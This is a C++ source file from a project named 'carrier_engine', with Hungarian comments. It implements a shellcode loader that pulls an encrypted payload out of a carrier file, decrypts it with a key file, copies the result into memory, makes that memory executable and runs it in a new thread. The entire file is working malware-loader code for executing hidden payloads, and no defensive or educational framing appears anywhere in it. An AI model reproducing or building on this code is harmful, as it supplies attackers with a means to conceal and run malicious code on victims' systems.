// src/loader.cpp
#include "carrier_engine/loader.hpp"
#include "carrier_engine/carrier/factory.hpp"
#include "carrier_engine/crypto/factory.hpp"
#include "carrier_engine/memory/executable_memory.hpp"
#include "carrier_engine/platform.hpp"
#include <stdexcept>

namespace carrier_engine {

    Loader::Loader(LoaderConfig config)
    : config_(std::move(config))
    , logger_(std::make_shared<Logger>(config_.log_level)) {}

    bool Loader::execute() {
        try {
            logger_->info("=== Carrier Engine Starting ===");
            logger_->info("Carrier: " + config_.carrier_path);

            // 1. Payload kinyerés
            logger_->info("Phase 1: Extracting payload...");
            auto carrier = carrier::create_carrier(
                config_.carrier_path,
                config_.carrier_config,
                logger_
            );
            auto encrypted = carrier->extract_payload();
            logger_->success("Extracted " + std::to_string(encrypted.size()) + " bytes");

            // 2. Dekódolás
            logger_->info("Phase 2: Decrypting...");
            auto crypto = crypto::create_decryptor(config_.key_path);
            auto shellcode = crypto->decrypt(encrypted);
            logger_->success("Decrypted " + std::to_string(shellcode.size()) + " bytes");

            // 3. Memória foglalás és futtatás
            logger_->info("Phase 3: Loading and executing...");
            ExecutableMemory memory(shellcode.size());
            memory.write(shellcode);
            memory.make_executable();

            platform::ThreadHandle thread = platform::create_thread(
                (platform::ThreadFunction)memory.ptr(),
                                                                    nullptr
            );
            platform::wait_for_thread(thread);
            platform::close_thread(thread);

            logger_->success("=== Execution completed ===");
            return true;

        } catch (const std::exception& e) {
            logger_->fatal(std::string("Error: ") + e.what());
            return false;
        }
    }

} // namespace carrier_engine
